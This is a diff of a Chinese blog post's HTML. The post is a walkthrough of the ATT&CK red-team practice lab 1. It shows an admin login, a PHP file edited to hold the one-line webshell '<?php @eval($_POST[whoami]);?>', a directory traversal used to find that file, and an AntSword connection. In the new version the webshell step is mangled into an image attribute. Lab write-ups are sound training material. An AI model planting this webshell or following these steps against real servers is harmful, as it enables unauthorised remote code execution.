@@ -16,58 +16,57 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="初探外网 1、访问web服务器win7的模拟外网ip——192.168.254.130  2、发现后台地址和密码，登录   3、修改php文件，写入webshell 1&lt;?php @eval($_POST[whoami]);?&gt; 注意，需要修改在第一行，原来写在第二行，无法通过蚁剑连接  4、找到文件目录，即路径 通过御剑进行后台扫描。随便点击一个url，发现存在目录遍历漏洞，耐心">
+    <meta name="description" content="初探外网 1、访问web服务器win7的模拟外网ip——192.168.254.130  2、发现后台地址和密码，登录   4、找到文件目录，即路径 通过御剑进行后台扫描。随便点击一个url，发现存在目录遍历漏洞，耐心找到修改的acomment.php所在位置。    5、通过蚁剑连接，密码：whoami，另外要选择编码方式  注：另一种连接方法为另写一个shell.php文件，内容为“”，则连接">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Bubble&#39;s Blog">
+<meta property="og:title" content="ATT&amp;CK红队评估实战靶场1">
 <meta property="og:url" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/index.html">
 <meta property="og:site_name" content="Bubble&#39;s Blog">
-<meta property="og:description" content="初探外网 1、访问web服务器win7的模拟外网ip——192.168.254.130  2、发现后台地址和密码，登录   3、修改php文件，写入webshell 1&lt;?php @eval($_POST[whoami]);?&gt; 注意，需要修改在第一行，原来写在第二行，无法通过蚁剑连接  4、找到文件目录，即路径 通过御剑进行后台扫描。随便点击一个url，发现存在目录遍历漏洞，耐心">
+<meta property="og:description" content="初探外网 1、访问web服务器win7的模拟外网ip——192.168.254.130  2、发现后台地址和密码，登录   4、找到文件目录，即路径 通过御剑进行后台扫描。随便点击一个url，发现存在目录遍历漏洞，耐心找到修改的acomment.php所在位置。    5、通过蚁剑连接，密码：whoami，另外要选择编码方式  注：另一种连接方法为另写一个shell.php文件，内容为“”，则连接">
 <meta property="og:locale" content="zn_CN">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.1.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.2.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.3.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.15.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.5.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.6.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.9.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.16.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.7.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.17.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.18.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.19.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.20.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.21.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.22.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.23.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.24.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.25.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.26.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.27.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.28.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.29.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.31.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.32.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.33.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.34.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.35.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.36.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.37.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.38.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.39.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.40.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.41.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.42.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.43.jpg">
-<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.44.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.1.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.2.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.3.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.5.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.6.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.9.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.16.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.7.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.17.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.18.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.19.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.20.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.21.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.22.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.23.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.24.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.25.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.26.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.27.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.28.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.29.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.31.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.32.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.33.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.34.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.35.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.36.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.37.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.38.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.39.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.40.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.41.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.42.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.43.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.44.jpg">
 <meta property="article:published_time" content="2024-02-24T07:49:38.457Z">
-<meta property="article:modified_time" content="2024-02-24T15:20:34.530Z">
+<meta property="article:modified_time" content="2024-02-25T06:38:17.402Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.1.jpg">
+<meta name="twitter:image" content="https://ybubble.github.io/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.1.jpg">
   
   
   
-  <title>Bubble&#39;s Blog</title>
+  <title>ATT&amp;CK红队评估实战靶场1 - Bubble&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -211,7 +210,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text=""></span>
+            <span id="subtitle" data-typed-text="ATT&amp;CK红队评估实战靶场1"></span>
           
         </div>
 
@@ -266,118 +265,132 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header"></h1>
+            <h1 id="seo-header">ATT&amp;CK红队评估实战靶场1</h1>
             
             
               <div class="markdown-body">
                 
-                <hr>
-<hr>
-<h1>初探外网</h1>
+                <h1>初探外网</h1>
 <p>1、访问web服务器win7的模拟外网ip——192.168.254.130</p>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.1.jpg" srcset="/img/loading.gif" lazyload alt="1.1"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.1.jpg" srcset="/img/loading.gif" lazyload class="">
 <p>2、发现后台地址和密码，登录</p>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.2.jpg" srcset="/img/loading.gif" lazyload alt="1.2"></p>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.3.jpg" srcset="/img/loading.gif" lazyload alt="1.3"></p>
-<p>3、修改php文件，写入webshell</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[whoami]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-<p>注意，需要修改在第一行，原来写在第二行，无法通过蚁剑连接</p>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.15.jpg" srcset="/img/loading.gif" lazyload alt="1.15"></p>
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.2.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.3.jpg" srcset="/img/loading.gif" lazyload class="" title="% 3、修改php文件，写入webshell <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[whoami]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure> 注意，需要修改在第一行，原来写在第二行，无法通过蚁剑连接 {% asset_img 1.15.jpg">
 <p>4、找到文件目录，即路径</p>
 <p>通过御剑进行后台扫描。随便点击一个url，发现存在目录遍历漏洞，耐心找到修改的acomment.php所在位置。</p>
-<p><img src="ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.5.jpg" srcset="/img/loading.gif" lazyload alt="1.5"></p>
-<img src="ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.6.jpg" srcset="/img/loading.gif" lazyload alt="1.6" style="zoom:67%;" />
-<img src="ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1.assets/1.9.jpg" srcset="/img/loading.gif" lazyload alt="1.9" style="zoom:67%;" />
+<img src="/2024/02/24/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA1/1.5.jpg" srcset="/img/loading.gif" lazyload class="">
